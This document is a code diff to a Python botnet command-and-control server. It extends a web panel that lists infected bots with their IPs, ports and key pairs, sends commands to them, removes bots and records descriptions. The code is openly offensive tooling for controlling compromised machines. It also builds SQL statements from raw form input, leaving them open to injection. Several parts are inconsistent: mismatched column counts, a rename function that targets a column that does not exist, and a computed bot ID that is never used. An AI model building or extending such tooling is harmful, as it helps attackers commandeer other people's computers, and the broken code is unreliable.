@@ -1,15 +1,18 @@
+
 import socket
 import threading
 import os
 import base64
 import json
 import time
+#import rsa
 import hashlib
 import sqlite3
 import sys
 import webbrowser
 import http.server
 
+# The server's IP address and port
 SERVER_IP = "172.22.9.105"
 SERVER_PORT = 12345
 
@@ -43,6 +46,7 @@ class BotnetServer(http.server.BaseHTTPRequestHandler):
         self.wfile.write(b"<h1>Botnet Server</h1>")
         self.wfile.write(b"<h2>Bots</h2>")
         self.wfile.write(b"<table>")
+        self.wfile.write(b"<tr><th>ID</th><th>IP</th><th>Port</th><th>Public Key</th><th>Private Key</th><th>Description</th></tr>")
         for bot in get_bots():
             self.wfile.write(b"<tr>")
             for column in bot:
@@ -71,6 +75,20 @@ class BotnetServer(http.server.BaseHTTPRequestHandler):
         self.wfile.write(b"</select>")
         self.wfile.write(b"<input type='submit' value='Send'>")
         self.wfile.write(b"</form>")
+        self.wfile.write(b"<h2>Manage Bots</h2>")
+        self.wfile.write(b"<form method='POST'>")
+        self.wfile.write(b"<select name='id'>")
+        for bot in get_bots():
+            self.wfile.write(b"<option value='")
+            self.wfile.write(str(bot[0]).encode())
+            self.wfile.write(b"'>")
+            self.wfile.write(str(bot[0]).encode())
+            self.wfile.write(b"</option>")
+        self.wfile.write(b"</select>")
+        self.wfile.write(b"<input type='submit' name='remove' value='Remove'>")
+        self.wfile.write(b"<input type='text' name='description' placeholder='Description'>")
+        self.wfile.write(b"<input type='submit' name='description' value='Update Description'>")
+        self.wfile.write(b"</form>")
         self.wfile.write(b"</body></html>")
 
     def do_POST(self):
@@ -79,10 +97,19 @@ class BotnetServer(http.server.BaseHTTPRequestHandler):
         post_data = post_data.decode()
         post_data = post_data.split("&")
         id = post_data[0].split("=")[1]
-        command = post_data[1].split("=")[1]
-        bot = get_bot(id)
-        if bot:
-            send_command(bot, command)
+        action = post_data[1].split("=")[0]
+        if action == 'remove':
+            remove_bot_from_db(id)
+        elif action == 'description':
+            description = post_data[1].split("=")[1]
+            # Replace '+' with spaces
+            description = description.replace('+', ' ')
+            update_description_in_db(id, description)
+        else:
+            command = post_data[1].split("=")[1]
+            bot = get_bot(id)
+            if bot:
+                send_command(bot, command)
         self.send_response(301)
         self.send_header("Location", "/")
         self.end_headers()
@@ -97,6 +124,11 @@ def start_server():
     while True:
         bot_socket, bot_address = server_socket.accept()
         bot_ip, bot_port = bot_address
+
+        # Receive MAC address from client and use it to generate bot ID
+        mac_address = bot_socket.recv(4096).decode()
+        bot_id = hashlib.md5(mac_address.encode()).hexdigest()
+
         bot = get_bot(bot_id)
         add_bot(bot_ip, bot_port)
         bot_socket.close()
@@ -105,8 +137,18 @@ def start_server():
 def create_database():
     connection = sqlite3.connect(DATABASE)
     cursor = connection.cursor()
+    cursor.execute(f"CREATE TABLE IF NOT EXISTS {TABLE} ({', '.join([f'{column} TEXT' for column in COLUMNS])}, description TEXT)")
     connection.commit()
     connection.close()
+def update_description_in_db(id, description):
+    try:
+        connection = sqlite3.connect(DATABASE)
+        cursor = connection.cursor()
+        cursor.execute(f"UPDATE {TABLE} SET description = '{description}' WHERE id = '{id}'")
+        connection.commit()
+        connection.close()
+    except Exception as e:
+        print(f"Error updating description: {e}")
 
 def get_bots():
     connection = sqlite3.connect(DATABASE)
@@ -128,14 +170,26 @@ def add_bot(ip, port):
     connection = sqlite3.connect(DATABASE)
     cursor = connection.cursor()
     bot_id = hashlib.md5(f'{ip}:{port}'.encode()).hexdigest()
+    cursor.execute(f"INSERT INTO {TABLE} VALUES (?, ?, ?, NULL, NULL, NULL)", (bot_id, ip, port))
     connection.commit()
     connection.close()
 
+def remove_bot_from_db(id):
     connection = sqlite3.connect(DATABASE)
     cursor = connection.cursor()
     cursor.execute(f"DELETE FROM {TABLE} WHERE id = '{id}'")
     connection.commit()
     connection.close()
+
+def rename_bot_in_db(id, new_name):
+    try:
+        connection = sqlite3.connect(DATABASE)
+        cursor = connection.cursor()
+        cursor.execute(f"UPDATE {TABLE} SET name = '{new_name}' WHERE id = '{id}'")
+        connection.commit()
+        connection.close()
+    except Exception as e:
+        print(f"Error renaming bot: {e}")
 
 def send_command(bot, command):
     bot_id, bot_ip, bot_port = bot
